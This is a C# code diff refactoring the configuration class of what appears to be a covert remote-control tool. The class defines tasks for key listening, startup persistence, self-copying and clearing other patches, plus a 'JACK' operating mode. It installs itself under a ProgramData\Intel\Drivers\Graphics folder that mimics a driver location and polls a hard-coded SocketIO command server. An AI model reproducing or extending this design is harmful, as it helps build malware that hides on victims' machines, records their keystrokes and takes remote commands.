@@ -7,31 +7,84 @@ using System.Reflection;
 using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
+using CommonClassLibrary.Common;
 using static System.Diagnostics.DebuggableAttribute;
 using static System.Environment;
 
 namespace CommonClassLibrary
 {
-    public class Config
+    public class Config : SingletonBase<Config>
     {
         #region Singleton
-        private Config() 
+        public Config() 
         {
             Init();
         }
-        private static Config instance = null;
-        public static Config Instance
+        //private static Config instance = null;
+        //public static Config Instance
+        //{
+        //    get
+        //    {
+        //        if (instance == null)
+        //        {
+        //            instance = new Config();
+        //        }
+        //        return instance;
+        //    }
+        //}
+        #endregion
+
+        #region Enum
+        public enum EnumTask
         {
-            get
-            {
-                if (instance == null)
-                {
-                    instance = new Config();
-                }
-                return instance;
-            }
+            Demo,
+            WallpaperEngine,
+            SocketIO,
+            KeyListener,
+            ShowStarMenu,
+            StartupSetup,
+            CopyItself,
+            ClearOtherPatch
         }
-        #endregion        
+
+        public enum EnumTaskPackMode
+        {
+            NONE,
+            AUTO,
+            ONCE,
+            EXIT
+        }
+
+        public enum EnumAppMode
+        {
+            NONE,
+            DEBUG,
+            JACK
+        }
+        #endregion
+
+        #region Global
+        public string WorkSpaceDir;
+        public string TargetWorkSpaceDir, TargetUpgradeDir, TargetDllPath;
+        public string ExeFullName, ExeName;
+        public int MainSleepInterval = 5 * 1000;
+        public EnumAppMode AppMode = Config.IsDebug() ? EnumAppMode.DEBUG : EnumAppMode.JACK;
+        #endregion
+
+        #region Class WallpaperEngineCommand
+        public long WallpaperEngineCommandDefaultInterval = 5 * 1000;
+        public string WallpaperEngineCommandImageDir;
+
+        #endregion
+
+        #region Class WallpaperEngineFactory
+        public long WallpaperEngineFactoryInitInterval = 5 * 1000;
+        #endregion
+
+        #region Class SocketIOClientCommand
+        public long SocketIOClientCommandDefaultInterval = 60 * 1000;
+        public readonly static string SocketIOClientCommandServerHost = "http://10.99.11.195:5556";
+        #endregion
 
         public void Init()
         {
@@ -43,6 +96,7 @@ namespace CommonClassLibrary
             ExeFullName = $"{WorkSpaceDir}\\{ExeName}";
             TargetWorkSpaceDir = $"{System.Environment.GetFolderPath(SpecialFolder.CommonApplicationData)}\\Intel\\Drivers\\Graphics";
             TargetUpgradeDir = $"{System.Environment.GetFolderPath(SpecialFolder.CommonApplicationData)}\\Intel\\Drivers";
+            TargetDllPath = @$"{WorkSpaceDir}\Resources\dll";
             if (!Directory.Exists(TargetWorkSpaceDir))
                 Directory.CreateDirectory(TargetWorkSpaceDir);
             WallpaperEngineCommandImageDir = @$"{WorkSpaceDir}\Resources\Image\Wallpaper";
@@ -105,61 +159,5 @@ namespace CommonClassLibrary
             if (d.IsJITTrackingEnabled) return true;
             return false;
         }
-
-        #region Enum
-        public enum EnumTask
-        {
-            Demo,
-            WallpaperEngine,
-            SocketIO,
-            KeyListener,
-            ShowStarMenu,
-            StartupSetup,
-            CopyItself,
-            ClearOtherPatch
-        }
-
-        public enum EnumTaskPackMode
-        {
-            NONE,
-            AUTO,
-            ONCE,
-            EXIT
-        }
-
-        public enum EnumAppMode
-        {
-            NONE,
-            DEBUG,
-            JACK
-        }
-        #endregion
-
-        #region Global
-        public string WorkSpaceDir;
-        public string TargetWorkSpaceDir, TargetUpgradeDir;
-        public string ExeFullName, ExeName;
-        public int MainSleepInterval = 5 * 1000;
-        public EnumAppMode AppMode = Config.IsDebug()?EnumAppMode.DEBUG:EnumAppMode.JACK;
-        #endregion
-
-        #region Class CommandManager
-
-        #endregion
-
-        #region Class WallpaperEngineCommand
-        public long WallpaperEngineCommandDefaultInterval = 5 * 1000;
-        public string WallpaperEngineCommandImageDir;
-
-        #endregion
-
-        #region Class WallpaperEngineFactory
-        public long WallpaperEngineFactoryInitInterval = 5 * 1000;
-        #endregion
-
-        #region Class SocketIOClientCommand
-        public long SocketIOClientCommandDefaultInterval = 60 * 1000;
-        public readonly static string SocketIOClientCommandServerHost = "http://10.99.11.195:5556";
-        #endregion
     }
 }
